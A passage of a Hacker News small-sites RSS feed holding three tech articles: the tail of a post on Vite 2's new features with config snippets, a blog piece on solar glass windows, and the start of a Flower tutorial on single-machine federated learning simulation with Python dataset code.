
<span><span><span>&lt;</span>FiltersShowcase</span><span>/&gt;</span></span>
</code></pre></div><div data-v-6204d012="" data-v-0b49e0db=""><p><img src="https://patak.dev/images/vite-2.jpg" alt="Vue in Markdown, CSS Filters Playground" data-v-0b49e0db=""></p><div data-v-0b49e0db=""><!--[--><p><label for="blur" data-v-0b49e0db="">blur</label></p><p><label for="hue-rotate" data-v-0b49e0db="">hue-rotate</label></p><p><label for="invert" data-v-0b49e0db="">invert</label></p><p><label for="grayscale" data-v-0b49e0db="">grayscale</label></p><p><label for="sepia" data-v-0b49e0db="">sepia</label></p><p><label for="saturate" data-v-0b49e0db="">saturate</label></p><p><label for="brightness" data-v-0b49e0db="">brightness</label></p><p><label for="contrast" data-v-0b49e0db="">contrast</label></p><p><label for="opacity" data-v-0b49e0db="">opacity</label></p><!--]--></div></div><p>When you are playing with the sliders, you may arrive at a pleasant result by exploration. It is possible because you see the results of your changes instantly. If you need to wait even a few seconds when changing the values, it can't work. The same idea applies to Vite. It enables us to craft our apps or pages with a tight feedback loop. We see the result of our changes immediately, and it opens the door to workflows that were not possible before.</p><h2 id="what-is-new-in-vite-2"> What is new in Vite 2</h2><p>You can check <a href="https://github.com/vitejs/vite/issues/1207" target="_blank" rel="noopener noreferrer">the discussion</a> that Evan started with the rationale for this next iteration. For a complete list of features check the <a href="https://vitejs.dev/" target="_blank" rel="noopener noreferrer">Vite docs</a>. It already supported most of the common dev flows out of the box, like JSX, Typescript, importing CSS and JSON, and also powerful features like <a href="https://vitejs.dev/guide/features.html#web-assembly" target="_blank" rel="noopener noreferrer">importing wasm files</a> and <a href="https://vitejs.dev/guide/features.html#web-workers" target="_blank" rel="noopener noreferrer">inline Web Workers</a>. What follows is a list of the biggest changes and new features in the new release.</p><h3 id="vite-docs"> Vite docs</h3><p>Vite has a new <a href="https://vitejs.dev/" target="_blank" rel="noopener noreferrer">docs site</a> built with <a href="https://vitepress.vuejs.org/" target="_blank" rel="noopener noreferrer">VitePress</a>. This is a great example of the dogfooding that is prevalent in the Vue ecosystem. In this case, previously with VuePress and now with Vite and VitePress, they can find issues and optimizations in vue core by pushing the envelope of what a SSG based in Vue can achieve.</p><p><a href="https://vitejs.dev/" target="_blank" rel="noopener noreferrer"><img src="https://patak.dev/images/vite-2-docs.jpg" alt=""></a></p><p>The <a href="https://vitejs.dev/guide/features.html" target="_blank" rel="noopener noreferrer">Features page</a> is an excellent place to learn about Vite 2 out of the box features. If you are migrating from Vite v1, check the <a href="https://vitejs.dev/guide/migration.html" target="_blank" rel="noopener noreferrer">dedicated migration page</a>. There is also a <a href="https://vitejs.dev/config/" target="_blank" rel="noopener noreferrer">Config reference</a> available. There is also a <a href="https://vitejs.dev/guide/comparisons.html" target="_blank" rel="noopener noreferrer">Comparisons page</a> that is a good place to learn about the different tradeoffs that Vite is taking compared to other tools.</p><p>There is an official <a href="https://github.com/vitejs/awesome-vite" target="_blank" rel="noopener noreferrer">Awesome Vite List</a> for community plugins, apps using Vite, and other interesting resources around the Vite ecosystem.</p><h3 id="framework-agnostic-core"> Framework agnostic core</h3><p>All Vue related handling has been moved to a <a href="https://github.com/vitejs/vite/tree/main/packages/plugin-vue" target="_blank" rel="noopener noreferrer">dedicated plugin</a>, that plays by the same rules as the plugins for other frameworks like React, Preact, and Svelte. The <a href="https://github.com/vitejs/vite/tree/main/packages/plugin-react-refresh" target="_blank" rel="noopener noreferrer">react plugin</a> is also part of the monorepo. The new <a href="https://github.com/vitejs/vite/tree/main/packages" target="_blank" rel="noopener noreferrer">monorepo organization</a> of the repository showcases this move:</p><div><pre><code>packages
  create-app
  playground
  plugin-legacy
  plugin-react-refresh
  plugin-vue-jsx
  plugin-vue
  vite
</code></pre></div><h3 id="new-universal-plugin-format"> New universal plugin format</h3><p>The new <a href="https://vitejs.dev/guide/api-plugin.html" target="_blank" rel="noopener noreferrer">vite plugins</a> format, <a href="https://vitejs.dev/guide/comparisons.html#wmr" target="_blank" rel="noopener noreferrer">inspired</a> by the work of <a href="https://github.com/preactjs/wmr" target="_blank" rel="noopener noreferrer">WMR</a>, enables to share plugins code at dev and build time. From Vite's source docs:</p><blockquote><p>Vite plugins support a subset of Rollup plugin API with a few extra vite-specific options. A valid vite plugin is also a valid Rollup plugin. On the contrary, a Rollup plugin may or may NOT be a valid vite universal plugin, since some Rollup features do not make sense in an unbundled dev server context. That said, as long as a rollup plugin doesn't have strong coupling between its bundle phase and output phase hooks then it should just work (that means, most of them). By default, the plugins are run during both serve and build. When a plugin is applied during serve, it will only run <strong>non output plugin hooks</strong> (see rollup type definition of <a href="https://rollupjs.org/guide/en/#build-hooks" target="_blank" rel="noopener noreferrer">Rollup Plugin Hooks</a>). You can think of the dev server as only running <code>const bundle = rollup.rollup()</code> but never calling <code>bundle.generate()</code>.</p></blockquote><p>This new plugin format allows Vite to reuse a log of plugins from the rollup ecosystem and also share more code with WMR. I am maintaining a list of Vite compatible official rollup plugins at <a href="https://vite-rollup-plugins.patak.dev/" target="_blank" rel="noopener noreferrer">Vite Rollup Plugins</a>.</p><h3 id="error-overlay"> Error overlay</h3><p>Following other tools, Vite will now display an error overlay in the browser when there is a compiler error or failed resolve in the code. This feature can be disabled using <code>hmr: { overlay: false }</code> in <code>vite.config.js</code></p><p><a href="https://twitter.com/youyuxi/status/1338323327971110912" target="_blank" rel="noopener noreferrer"><img src="https://patak.dev/images/vite-2-error-overlay.jpg" alt=""></a></p><h3 id="lib-mode"> Lib mode</h3><p>Vite now supports <a href="https://twitter.com/youyuxi/status/1343291778745720834" target="_blank" rel="noopener noreferrer">building libraries</a>. Changes to the source code will be watched by Vite, so for browser-centric libs, you can have a great dev experience and optimized builds. The following config defaults to building the library in both <code>'es'</code> and <code>'umd'</code> format. <code>'cjs'</code> and <code>'iife'</code> can be added using <a href="https://vitejs.dev/config/#build-lib" target="_blank" rel="noopener noreferrer"><code>formats</code></a>.</p><p><code>vite.config.js</code></p><div><pre><code><span>const</span> path <span>=</span> <span>require</span><span>(</span><span>'path'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  build<span>:</span> <span>{</span>
    lib<span>:</span> <span>{</span>
      entry<span>:</span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>'src/main.js'</span><span>)</span><span>,</span>
      name<span>:</span> <span>'LibName'</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div><h3 id="multi-entry-mode"> Multi entry mode</h3><p>There can now be multiple entry points, and Vite will perform <a href="https://twitter.com/youyuxi/status/1341864579182301191" target="_blank" rel="noopener noreferrer">auto code splitting for JS and CSS</a> when building them.</p><p><code>vite.config.js</code></p><div><pre><code><span>const</span> <span>{</span> resolve <span>}</span> <span>=</span> <span>require</span><span>(</span><span>'path'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  build<span>:</span> <span>{</span>
    rollupOptions<span>:</span> <span>{</span>
      input<span>:</span> <span>{</span>
        main<span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'index.html'</span><span>)</span><span>,</span>
        nested<span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'nested/index.html'</span><span>)</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div><h3 id="strong-caching-of-npm-deps"> Strong caching of npm deps</h3><p>When importing <a href="https://vitejs.org/guide/features.html#npm-depndency-resolving" target="_blank" rel="noopener noreferrer">npm dependencies</a>, they will now be using disk or memory cache after the first load. The cache will auto invalidates if you upgrade the dependency to a newer version, but the imports will not even hit the dev server once they are cached by the browser.</p><p><a href="https://twitter.com/youyuxi/status/1341787928540930048" target="_blank" rel="noopener noreferrer"><img src="https://patak.dev/images/vite-2-dependencies.jpg" alt=""></a></p><h3 id="other-highlights"> Other highlights</h3><p>There are a lot of other important improvements in the new version. These are some of the enhancements that are not expanded in this post:</p><ul><li>Middleware mode, allowing Vite to run as part of existing express compatible servers</li><li>Default to modern only, Opt-in to legacy mode</li><li><a href="https://vitejs.dev/guide/migration.html#config-options-change" target="_blank" rel="noopener noreferrer">Revised config format</a></li><li>Smaller and faster install</li><li><a href="https://vitejs.dev/guide/api-javascript.html" target="_blank" rel="noopener noreferrer">Improved JS API</a></li><li><a href="https://vitejs.dev/guide/migration.html#hmr-api-change" target="_blank" rel="noopener noreferrer">HMR API alignment with other tools</a></li><li>Improved alias and resolving</li><li>Better vue perf (single request in most cases)</li><li>Support native esm config files</li><li>Auto restart server on config and .env changes</li><li>Support for <a href="https://github.com/vitejs/vite/tree/main/packages/plugin-vue-jsx" target="_blank" rel="noopener noreferrer">Vue JSX with HMR</a></li><li>Support using variables in dynamic imports, like <code>await import(`./views/${view}.js`)</code></li></ul><h2 id="feeling-the-speed"> Feeling the speed</h2><p>As Evan You <a href="https://www.youtube.com/watch?v=xXrhg26VCSc" target="_blank" rel="noopener noreferrer">has said</a>, you need to try it out to get a feeling of the raw speed that Vite is capable of. To <a href="https://vitejs.dev/guide/#scaffolding-your-first-vite-project" target="_blank" rel="noopener noreferrer">scaffold a new vite App</a> you can use</p><p>You will be prompted to choose a project name and a template</p><div><pre><code>√ Project name: · next-gen-app
Scaffolding project <span>in</span> path/next-gen-app<span>..</span>.
? Select a template: <span>..</span>.
<span>&gt;</span> vanilla
  vue
  vue-ts
  react
  react-ts
  preact
  preact-ts
</code></pre></div><p>Once the app is created, start the dev server with</p><div><pre><code><span>cd</span> next-gen-app
<span>yarn</span>
<span>yarn</span> dev
</code></pre></div><p>Modify the files with the browser open to see your modifications be reflected instantly. A nice way to test how fast Vite updates the app is to toggle auto save, and then play with CSS or modify the files. It should feel like you are directly using the browser dev tools (in <a href="https://code.visualstudio.com/docs/editor/codebasics#_save-auto-save" target="_blank" rel="noopener noreferrer">VS Code</a>, you can enable it using <code>Cmd+Shift+P</code> then type "Auto Save" and fire the <code>File: Toggle Auto Save</code> action).</p><p>If you would like to see how it works for a real application, at <a href="https://www.leniolabs.com/" target="_blank" rel="noopener noreferrer">Leniolabs_</a> we have been using Vite to craft <a href="https://grid.layoutit.com/" target="_blank" rel="noopener noreferrer">Layoutit Grid</a> and we recently migrated it to Vite 2 as part of the work we are doing for grid v2. You can <a href="https://github.com/Leniolabs/layoutit-grid" target="_blank" rel="noopener noreferrer">clone the repo</a> and play with the dev server.</p><p>There will continue to be a lot of <a href="https://vitejs.dev/guide/comparisons.html" target="_blank" rel="noopener noreferrer">healthy cross-pollination</a> between the Vite, Snowpack, and WMR. These tools are paving the way for a future where we can get back to have that lost magical experience of an instant feedback loop between our code changes and our pages. Like <a href="http://worrydream.com/" target="_blank" rel="noopener noreferrer">Bret Victor</a> said in his marvelous talk <a href="https://youtu.be/PGDrIy1G1gU" target="_blank" rel="noopener noreferrer">Inventing on Principle</a>, creators need an immediate connection to what they are creating.</p><p><a href="https://100.antfu.me/005?q=(cos(2t*(r-1))-sin(t%2B5*th))*.5+" target="_blank" rel="noopener noreferrer"><img src="https://patak.dev/images/vite-2-polar.jpg" alt=""></a></p><p>A good example of this principle in practice was <a href="https://twitter.com/aemkei/status/1323399877611708416" target="_blank" rel="noopener noreferrer">the release</a> of <a href="https://tixy.land/" target="_blank" rel="noopener noreferrer">tixy.land by …</a></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://patak.dev/web/vite-2.html">https://patak.dev/web/vite-2.html</a></em></p>]]>
            </description>
            <link>https://patak.dev/web/vite-2.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779588</guid>
            <pubDate>Thu, 14 Jan 2021 17:53:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Solar Glass Changing the World of Renewable Solar Energy]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25779535">thread link</a>) | @scottbucks
<br/>
January 14, 2021 | https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities | <a href="https://web.archive.org/web/*/https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.13.3"><div dir="ltr"><div><h3 id="viewer-foo"><span><span>This technology can turn any window into an energy-generating panel</span></span></h3><div id="viewer-761ht"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities" data-pin-media="https://static.wixstatic.com/media/nsplsh_2f1962e8a60e41f8a571b853e38e7981~mv2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/nsplsh_2f1962e8a60e41f8a571b853e38e7981~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-m9ue"><span>Photo-voltaic modules (otherwise known as <strong>Solar Panels</strong>)<!-- --> have been around for a while, allowing us to <!-- -->use <!-- -->sunlight<!-- --> as a source of energy<!-- -->. The issue with solar panels is that they need sufficient space on rooftops or on the ground to produce enough energy for them to be worth it, space that is limited in big cities. </span></p><p id="viewer-dkhis"><span>In recent years, companies have been working on a solution to this problem: <strong>Solar Glass</strong> (often referred to as "Solar Windows"), which can turn windows into power-generating panels.</span></p><h2 id="viewer-efmla"><span>What is Solar Glass?</span></h2><p id="viewer-8bpoh"><span>Solar glass is used to replace conventional <!-- -->building<!-- --> materials<!-- --> in parts such as the roof, skylights, facades and windows<!-- -->, whilst also generating electricity on-site.</span></p><p id="viewer-5gpt4"><span>The key difference between this recent technology and traditional solar PV (Photo-voltaic) is that the panels are built into the building rather than being added on. This allows for more of a relationship between aesthetics and functionality.</span></p><p id="viewer-5v8m5"><span>The most common type of Solar Glass is <strong>T</strong><strong>hin-film modules</strong> (e.g. amorphous silicon, cadmium telluride) which<!-- --> been around for a few years. They can be designed into the fabric of a building and can perform in conditions/locations where crystalline silicon panels (conventional solar panels) cannot. </span></p><p id="viewer-e6r4b"><span>This solar glass has a varying efficiency that depends on it's<!-- --> opacity which it's self varies between 50% transparent and fully opaque. The greater opacity they have, the more efficient they'll be, but on the other hand, being less transparent will allow less light to penetrate through.</span></p><h3 id="viewer-4um67"><span><span>Suggested Articles:</span></span></h3><ul><li id="viewer-49mml"><p><strong>🚄 </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-f6604"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️</strong></p></li><li id="viewer-6hik8"><p><span><strong>🏭 </strong></span><a href="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" target="_blank" rel="noopener"><strong><u>Carbon Capture, Usage and Storage: The Solution to the Climate Crisis?</u></strong></a></p></li></ul><h2 id="viewer-2oa4c"><span>Why use Solar Glass? </span></h2><p id="viewer-nkfr"><span>In the current state that the world is in, we need to start properly transitioning away from fossil fuels and towards renewable energy if we want to reduce our <a href="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" target="_blank" rel="noopener"><u>carbon emissions</u></a>. There are several options when it comes to renewable energy: <!-- -->Wind, Hydro, Tidal, Geothermal, Biomass and of course Solar energy.</span></p><p id="viewer-4befc"><span>Sunlight is one of our planet’s most abundant and freely available energy resources. The amount of solar energy that reaches the earth’s surface in one hour is more than the planet’s total energy requirements for a whole year so trying to harness that energy seems obvious.</span></p><p id="viewer-etkau"><span>Up until now, <!-- -->crystalline silicon Solar Panels have accounted <!-- -->opacity which it's self varies between 50% transparent and fully opaque. The greater opacity they have, the more efficient they'll be, but on the other hand, being less transparent will allow less light to penetrate through.</span></p><p id="viewer-36bae"><span>For big cities on the other hand, where most buildings are several stories high, close together and made primarily out of glass, there's simply not enough space, which is why solar glass, with the ability to turn these glass windows into energy-generating panels, seems like the perfect solution. </span></p><h3 id="viewer-6r5bk"><span>Other benefits to solar glass</span></h3><p id="viewer-dk9sg"><span>Other than producing electricity, solar glass offers several other benefits when <a href="https://www.spiritenergy.co.uk/kb-solar-glass-photovoltaic-windows" target="_blank" rel="noopener"><u>integrated into buildings</u></a>:</span></p><ul><li id="viewer-ccm8d"><p><strong>Transparency</strong> allows for light to penetrate the building whilst also providing <strong><span>shading and glare control</span></strong><span>.</span></p></li><li id="viewer-c9trm"><p>T<span>hanks to their multi-layer structure, Solar modules possess <strong>sound insulating properties</strong>. The insulation can even be adjusted by increasing or decreasing the thickness of the glazing.</span></p></li><li id="viewer-76vie"><p><span>Because the temperature of a PV module can increase significantly when the module is exposed to radiation, the heat it then radiates can be harnessed to provide <strong>t</strong></span><strong>hermal control</strong> like <strong>thermal insulation</strong>, <strong>reduction in thermal gain</strong>. </p></li><li id="viewer-9uuc2"><p><strong>Aesthetics</strong>: Different colours and effects can be applied to Solar Glass.</p></li></ul><h2 id="viewer-bamr9"><span>Where can it be used?</span></h2><p id="viewer-3r7su"><span>Solar Glass technology can be used in many different applications thanks to it's partial transparency making it much more versatile, for example:</span></p><ul><li id="viewer-bg9bs"><p><strong>Solar Windows</strong> are probably the most obvious way of using this technology, allowing skyscrapers for example to have power-generating facades.</p></li><li id="viewer-111bt"><p>Solar Glass can also be used for <strong>Bus Stops.</strong> </p></li></ul><ul><li id="viewer-4mp8j"><p><strong>Atriums</strong> and <strong>skylights.</strong></p></li><li id="viewer-11ues"><p>It's also perfect for <span><strong>privacy protection panels</strong> because it doesn't let in too much light seeing as it can only go up to 50% transparency.</span></p></li></ul><h2 id="viewer-6cqjg"><span><span>The Solar Glass pioneers </span></span></h2><p id="viewer-7jpbo"><span><span>There are many companies around the world working on making Solar Glass mainstream, here are some of the pioneers.</span></span></p><h3 id="viewer-fd55"><span><span>Ubiquitous Energy</span></span></h3><p id="viewer-1aokf"><span>First off there is <a href="https://ubiquitous.energy/" target="_blank" rel="noopener"><u>Ubiquitous Energy</u></a>, a Silicon Valley technology company leading the development of next-generation solar technologies. Born from research at MIT and Michigan State University, founded on the principle of seamlessly integrating solar technology into everyday products and surfaces. They have since developed a transparent solar coating that integrates into standard windows, with endless possibilities for future applications.</span></p><h3 id="viewer-enp20"><span>Physee</span></h3><p id="viewer-1n23a"><span>The European manufacturer <a href="https://www.physee.eu/" target="_blank" rel="noopener"><u>Physee</u></a> was actually the first to install transparent solar panels. The company developed a technology they call the "Power Bar" which is small solar panels that are installed along the window pane edges to generate power.</span></p><p id="viewer-dihln"><span>Physee is also working on <!-- -->power generating glass coating. It directs sunlight onto integrated solar cells in PowerWindows. Without impacting the transparency of its glass, windows will produce the same energy as 1/5 of a solar panel placed on a building's roof.</span></p><h2 id="viewer-dc5n2"><span>Bottom Line</span></h2><p id="viewer-igh5"><span>The bottom line is that, although this technology is not yet widely available and still in it's early stages, Solar Glass seems like a very promising new way to generate electricity from the sun. With companies continuing to innovate and improve their products, we may well be seeing our first Solar Glass buildings within the next decade, let's wait and see!</span></p><p id="viewer-58ct9"><span><strong>Sources:</strong></span></p><p id="viewer-8ll7g"><span><strong>- </strong><a href="https://www.spiritenergy.co.uk/kb-solar-glass-photovoltaic-windows" target="_blank" rel="noopener"><u>https://www.spiritenergy.co.uk/kb-solar-glass-photovoltaic-windows</u></a> </span></p><p id="viewer-97jl"><span><strong>- </strong><a href="https://ubiquitous.energy/about/" target="_blank" rel="noopener"><u>https://ubiquitous.energy/about/</u></a> </span></p><p id="viewer-8togt"><span>- <a href="https://www.physee.eu/innovation/coating" target="_blank" rel="noopener"><u>https://www.physee.eu/innovation/coating</u></a> </span></p><p id="viewer-570b8"><span>- <a href="https://solarmagazine.com/solar-panels/transparent-solar-panels/" target="_blank" rel="noopener"><u>https://solarmagazine.com/solar-panels/transparent-solar-panels/</u></a> </span></p><h3 id="viewer-40d8a"><span><span><strong>More from The Detechtor:</strong></span></span></h3><ul><li id="viewer-d442b"><p><strong>🚄 </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-60rl6"><p><span><strong>🏭 </strong></span><a href="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" target="_blank" rel="noopener"><strong><u>Carbon Capture, Usage and Storage: The Solution to the Climate Crisis?</u></strong></a></p></li><li id="viewer-5srnl"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️</strong></p></li></ul><h3 id="viewer-cbj21"><span><span>Stay updated:</span></span></h3><ul><li id="viewer-7c1et"><p>📩 Want the latest on the impact of tech? <strong>Subscribe</strong> to our <strong>newsletter</strong>!</p></li><li id="viewer-6bd12"><p>🎙 <a href="http://thedetechtor.com/" target="_blank" rel="noopener"><u>The Detechtor Podcast</u></a> is available on all podcast players!                                                      <strong>Subscribe</strong> on <a href="https://podcasts.apple.com/fr/podcast/the-detechtor-podcast/id1537457578?l=en" target="_blank" rel="noopener"><u>Apple Podcasts</u></a> | <a href="https://open.spotify.com/show/5kc8WA6nZC69bQ1sbOrlNi?si=CwAuAtpfRpe7WmLu1PlO8w" target="_blank" rel="noopener"><u>Spotify</u></a> | <a href="https://podcasts.google.com/search/The%20detechtor%20Podcast" target="_blank" rel="noopener"><u>Google Podcasts</u></a> | <a href="https://www.stitcher.com/show/the-detechtor-podcast" target="_blank" rel="noopener"><u>Stitcher</u></a> | <a href="https://tunein.com/podcasts/Technology-Podcasts/The-Detechtor-Podcast-p1377296/?topicid=158813573" target="_blank" rel="noopener"><u>Tunein</u></a></p></li><li id="viewer-4tmjb"><p>📲 Let's connect! <strong>Follow</strong> <strong>us</strong> on <a href="https://twitter.com/the_detechtor" target="_blank" rel="noopener"><u>Twitter</u></a> | <a href="https://www.instagram.com/thedetechtor/" target="_blank" rel="noopener"><u>Instagram</u></a> | <a href="https://www.facebook.com/thedetechtor" target="_blank" rel="noopener"><u>Facebook</u></a> | <a href="https://www.youtube.com/channel/UCAW--4_mML4A86W3670ix3w" target="_blank" rel="noopener"><u>Youtube</u></a></p></li></ul></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779535</guid>
            <pubDate>Thu, 14 Jan 2021 17:50:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Single-Machine Simulation of Federated Learning Systems]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25779486">thread link</a>) | @tanto
<br/>
January 14, 2021 | https://flower.dev/blog/2021-01-14-single-machine-simulation-of-federated-learning-systems | <a href="https://web.archive.org/web/*/https://flower.dev/blog/2021-01-14-single-machine-simulation-of-federated-learning-systems">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>This is the first part in a series of blog posts that demonstrate how a single-machine Federated Learning simulation can be scaled up to a large number of clients involving multiple machines. Initially you will learn how to create a simulation with Flower and in the second part distribute the simulation to multiple machines. In the third part of this series you will learn how to run each Federated Learning client on a single dedicated machine and configure Flower so that you can scale to far more clients. In each subsequent part we will build upon the previous code.</p><blockquote><p>Federated Learning brings together people from a diverse set of backgrounds. Building FL systems requires expertise in machine learning, distributed systems, software engineering, and operations, to name just a few.
– <a href="https://twitter.com/daniel_janes">Daniel J. Beutel</a></p></blockquote><p>At the end of this series we aim to show that, although Federated Learning is challenging to implement, Flower can make it easy to start with an idea, simulate it, and then gradually evolve it to bring it into production.</p><h2>Series</h2><ul><li><strong>Part 1: Single-Machine Simulation of Federated Learning Systems</strong></li><li>Part 2: Multi-Machine Simulation of Federated Learning Systems (coming soon)</li><li>Part 3: Evolving Workloads From Simulation Towards Production (coming soon)</li></ul><h2>Single-Machine Simulation</h2><p>What do we mean when we say simulate the Federated Learning process? Let us start with a quote from Wikipedia.</p><blockquote><p>A simulation is an approximate imitation of the operation of a process or system that represents its operation over time. Simulation is used in many contexts, such as simulation of technology for performance tuning or optimizing.
– <a href="https://en.wikipedia.org/wiki/Simulation">Wikipedia</a></p></blockquote><p>When we talk about a simulation with Flower we mean running an entire Federated Learning system (one server and multiple clients) on a single machine. Real-world Federated Learning systems (e.g., on mobile devices) have characteristics that are not present in simulation (e.g., connectivity issues), but well-crafted simulations are often a good starting point when developing a new system.</p><h2>Overview</h2><p>Our simulation will run one Federated Learning server and ten clients. We will write the code in such a way that we can increase the number of clients at a later point. All the code is available in the Flower repository in the <a href="https://github.com/adap/flower/tree/main/examples/simulation">examples directory</a>.</p><p>Our simulation will start the server as well as all clients using sub-processes of our main process. The main process will block until each of these processes exits. For the purpose of the simulation we are also going to create our own partitioned dataset.</p><h2>Dataset</h2><p>Federated Learning solves the problem of learning a model over multiple datasets. For research purposes, we often use an existing dataset and artificially split it into multiple partitions. This simulation uses CIFAR-10 and partitions it into as many partitions as there are clients in our simulation. All the code related to this is in its own Python module named <code>dataset.py</code>.</p><p>To get started we import <code>tensorflow</code>, <code>numpy</code>, and <code>flwr</code> and define some types that are going to be used in the signatures of our functions.</p><div><article><p>Copy</p><pre><code><span>from</span><span> typing </span><span>import</span><span> List, Tuple, cast
</span>
<span></span><span>import</span><span> tensorflow </span><span>as</span><span> tf
</span><span></span><span>import</span><span> numpy </span><span>as</span><span> np
</span>
<!-- -->XY = Tuple[np.ndarray, np.ndarray]
<!-- -->XYList = List[XY]
<!-- -->PartitionedDataset = List[Tuple[XY, XY]]
</code></pre></article></div><p><code>PartitionedDataset</code> will be our usual dataset which we normally would unpack as follows.</p><div><article><p>Copy</p><pre><code><span>local_dataset = partitioned_dataset[</span><span>0</span><span>]
</span>(x_train, y_train), (x_test, y_test) = local_dataset
</code></pre></article></div><p>Let's define a few helper methods now. The comments will explain what they do.</p><div><article><p>Copy</p><pre><code><span>def</span><span> </span><span>shuffle</span><span>(</span><span>x: np.ndarray, y: np.ndarray</span><span>) -&gt; XY:</span><span>
</span><span>    </span><span>"""Shuffle x and y."""</span><span>
</span><span>    idx = np.random.permutation(</span><span>len</span><span>(x))
</span><span>    </span><span>return</span><span> x[idx], y[idx]
</span>
<!-- -->
<span></span><span>def</span><span> </span><span>partition</span><span>(</span><span>x: np.ndarray, y: np.ndarray, num_partitions: </span><span>int</span><span>) -&gt; XYList:</span><span>
</span><span>    </span><span>"""Split x and y into a number of partitions."""</span><span>
</span><span>    </span><span>return</span><span> </span><span>list</span><span>(</span><span>zip</span><span>(np.split(x, num_partitions), np.split(y, num_partitions)))
</span>
<!-- -->
<span></span><span>def</span><span> </span><span>create_partitions</span><span>(</span><span>
</span><span>    source_dataset : XY,
</span><span>    num_partitions: </span><span>int</span><span>,
</span><span></span><span>) -&gt; XYList:</span><span>
</span><span>    </span><span>"""Create partitioned version of a source dataset."""</span><span>
</span>    x, y = source_dataset 
<!-- -->    x, y = shuffle(x, y)
<!-- -->    xy_partitions = partition(x, y, num_partitions)
<!-- -->
<span>    </span><span>return</span><span> xy_partitions</span></code></pre></article></div><p>Now we just need to bring everything together in a final function which will return the list of smaller datasets derived from CIFAR-10.</p><div><article><p>Copy</p><pre><code><span>def</span><span> </span><span>load</span><span>(</span><span>
</span><span>    num_partitions: </span><span>int</span><span>,
</span><span></span><span>) -&gt; PartitionedDataset:</span><span>
</span><span>    </span><span>"""Create partitioned version of CIFAR-10."""</span><span>
</span>    xy_train, xy_test = tf.keras.datasets.cifar10.load_data()
<!-- -->
<!-- -->    xy_train_partitions = create_partitions(xy_train, num_partitions)
<!-- -->    xy_test_partitions = create_partitions(xy_test, num_partitions)
<!-- -->
<span>    </span><span>return</span><span> </span><span>list</span><span>(</span><span>zip</span><span>(xy_train_partitions, xy_test_partitions))</span></code></pre></article></div><p>You can find the full version <a href="https://github.com/adap/flower/blob/main/examples/simulation/dataset.py">here</a></p><p>We now have a simple function which will return a partitioned version of CIFAR-10. Each partition will only be passed to a single client which will perform its training exclusively on that partition.</p><h2>Simulation</h2><p>We are now going to create a fairly simple simulation based on our partitioned dataset. We again start by importing the necessary libraries:</p><div><article><p>Copy</p><pre><code><span>from</span><span> multiprocessing </span><span>import</span><span> Process
</span><span></span><span>import</span><span> os
</span><span></span><span>from</span><span> typing </span><span>import</span><span> Tuple
</span>
<span></span><span># Make TensorFlow log less verbose</span><span>
</span><span>os.environ[</span><span>"TF_CPP_MIN_LOG_LEVEL"</span><span>] = </span><span>"3"</span><span>
</span>
<span></span><span>import</span><span> time
</span><span></span><span>import</span><span> tensorflow </span><span>as</span><span> tf
</span><span></span><span>import</span><span> numpy </span><span>as</span><span> np
</span><span></span><span>import</span><span> flwr </span><span>as</span><span> fl
</span><span></span><span>from</span><span> flwr.server.strategy </span><span>import</span><span> FedAvg
</span>
<span></span><span>import</span><span> dataset
</span>
<span></span><span># Used for type signatures</span><span>
</span>DATASET = Tuple[Tuple[np.ndarray, np.ndarray], Tuple[np.ndarray, np.ndarray]]
